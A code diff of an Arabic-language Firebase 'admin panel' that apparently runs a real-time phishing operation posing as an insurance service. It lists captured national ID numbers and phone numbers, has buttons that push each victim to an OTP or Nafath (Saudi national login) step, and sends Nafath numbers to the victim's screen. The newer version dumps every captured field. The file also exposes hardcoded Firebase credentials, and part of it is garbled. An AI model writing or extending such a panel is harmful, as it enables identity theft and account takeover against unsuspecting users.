@@ -1,161 +1,23 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>إدارة تري | Admin Panel</title>
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
-    
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; padding: 20px; direction: rtl; }
-        .header { background: #00ff9d; color: #0d1b1a; padding: 15px; border-radius: 10px; margin-bottom: 20px; text-align: center; }
-        .order-card { background: white; border-radius: 12px; padding: 15px; margin-bottom: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border-right: 5px solid #00ff9d; }
-        .details { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
-        .details span { font-weight: bold; color: #555; }
-        .actions { display: flex; gap: 10px; flex-wrap: wrap; border-top: 1px solid #eee; pt: 10px; padding-top: 10px; }
-        button { padding: 10px 15px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; }
-        .btn-otp { background: #ffc107; color: #000; }
-        .btn-nafath { background: #17a2b8; color: #white; }
-        .btn-reject { background: #dc3545; color: #fff; }
-        .btn-send { background: #28a745; color: #fff; }
-        input { padding: 8px; border: 1px solid #ddd; border-radius: 5px; width: 80px; }
-    </style>
-</head>
-<body>
-
-<div class="header">
-    <h1>لوحة تحكم الطلبات - تري 🛡️</h1>
-</div>
-
-<div id="orders-list">
-    <h3 style="text-align: center;">جاري تحميل البيانات...</h3>
-</div>
-
-<script>
-    // إعدادات Firebase الخاصة بك (مشروع tameen-658e9)
-    const firebaseConfig = {
-        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
-        authDomain: "tameen-658e9.firebaseapp.com",
-        projectId: "tameen-658e9",
-        storageBucket: "tameen-658e9.firebasestorage.app",
-        messagingSenderId: "292670676256",
-        appId: "1:292670676256:web:3624157751cd194efe4b45"
-    };
-
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
-
-    // جلب البيانات بدون "orderBy" لضمان ظهورها فوراً
-    db.collection("orders").onSnapshot((snapshot) => {
-        const listDiv = document.getElementById('orders-list');
-        listDiv.innerHTML = ""; // مسح القائمة الحالية
-
-        if (snapshot.empty) {
-            listDiv.innerHTML = "<p style='text-align:center;'>لا توجد طلبات حالياً في قاعدة البيانات.</p>";
-            return;
-        }
-
-        snapshot.forEach((doc) => {
-            const data = doc.data();
-            const id = doc.id;
-
-            const card = `
-                <div class="order-card">
-                    <div class="details">
-                        <div><span>رقم الهوية:</span> ${data.id || id}</div>
-                        <div><span>الجوال:</span> ${data.phone || 'غير متوفر'}</div>
-                        <div><span>الرقم التسلسلي:</span> ${data.serial || 'غير متوفر'}</div>
-                        <div><span>الحالة الحالية:</span> <b style="color:blue;">${data.status || 'في الانتظار'}</b></div>
-                    </div>
-                    <div class="actions">
-                        <button class="btn-otp" onclick="updateStep('${id}', 'GO_TO_OTP')">طلب كود OTP</button>
-                        <button class="btn-nafath" onclick="updateStep('${id}', 'GO_TO_NAFATH')">تحويل لنفاذ</button>
-                        <button class="btn-reject" onclick="updateStep('${id}', 'GO_TO_REJECT')">رفض الطلب</button>
-                        <div style="margin-right: auto;">
-                            <input type="number" id="code-${id}" placeholder="رقم نفاذ">
-                            <button class="btn-send" onclick="sendNafathCode('${id}')">إرسال الرقم</button>
-                        </div>
-                    </div>
-                </div>
-            `;
-            listDiv.innerHTML += card;
-        });
-    });
-
-    // تحكم في الخطوة القادمة للزبون
-    async function updateStep(docId, step) {
-        try {
-            await db.collection("orders").doc(docId).update({
-                next_step: step,
-                status: "تم توجيه الزبون لـ " + step
-            });
-            alert("تم إرسال الأمر بنجاح!");
-        } catch (err) {
-            console.error(err);
-            alert("حدث خطأ: " + err.message);
-        }
-    }
-
-    // إرسال رقم نفاذ المحدد
-    async function sendNafathCode(docId) {
-        const codeInput = document.getElementById(`code-${docId}`);
-        if (!codeInput.value) return alert("اكتب الرقم أولاً");
-        
-        try {
-            await db.collection("orders").doc(docId).update({
-                nafath_code: codeInput.value,
-                next_step: "SHOW_NAFATH_CODE",
-                status: "تم إرسال رقم نفاذ: " + codeInput.value
-            });
-            alert("تم إرسال الرقم للشاشة عند الزبون.");
-        } catch (err) {
-            alert("خطأ في الإرسال.");
-        }
-    }
-</script>    // جلب البيانات "لايف" وعرض كل الحقول المتاحة
 db.collection("orders").onSnapshot((snapshot) => {
     const listDiv = document.getElementById('orders-list');
     listDiv.innerHTML = ""; 
 
-    if (snapshot.empty) {
-        listDiv.innerHTML = "<p style='text-align:center;'>لا توجد طلبات حالياً.</p>";
-        return;
-    }
-
     snapshot.forEach((doc) => {
         const data = doc.data();
-        const id = doc.id;
-
-        // بناء قائمة البيانات ديناميكياً (عشان يظهر كل شي مخفي)
+        console.log("البيانات الواصلة:", data); // افتح الـ Console عشان تشوفها هون
+        
         let allFieldsHTML = "";
-        for (let key in data) {
-            if (key !== 'timestamp') { // تخطي الوقت لإبقاء المنظر مرتب
-                allFieldsHTML += `<div><span>${key}:</span> ${data[key]}</div>`;
-            }
-        }
+        Object.keys(data).forEach(key => {
+            allFieldsHTML += `<div style="margin:5px 0;"><b>${key}:</b> ${data[key]}</div>`;
+        });
 
-        const card = `
-            <div class="order-card" style="border-right: 5px solid #007bff;">
-                <div class="details">
-                    ${allFieldsHTML}
-                </div>
-                <div class="actions">
-                    <button class="btn-otp" onclick="updateStep('${id}', 'GO_TO_OTP')">طلب كود OTP</button>
-                    <button class="btn-nafath" onclick="updateStep('${id}', 'GO_TO_NAFATH')">تحويل لنفاذ</button>
-                    <button class="btn-reject" onclick="updateStep('${id}', 'GO_TO_REJECT')">رفض الطلب</button>
-                    <div style="margin-right: auto;">
-                        <input type="number" id="code-${id}" placeholder="رقم نفاذ">
-                        <button class="btn-send" onclick="sendNafathCode('${id}')">إرسال الرقم</button>
-                    </div>
-                </div>
-            </div>
-        `;
-        listDiv.innerHTML += card;
+        listDiv.innerHTML += `
+            <div class="order-card" style="border: 2px solid #00ff9d; margin: 10px; padding: 15px; border-radius: 10px; background: white;">
+                ${allFieldsHTML}
+                <hr>
+                <button onclick="updateStep('${doc.id}', 'GO_TO_OTP')">طلب OTP</button>
+                <button onclick="updateStep('${doc.id}', 'GO_TO_NAFATH')">نفاذ</button>
+            </div>`;
     });
 });
-
-
-
-</body>
-</html>
 
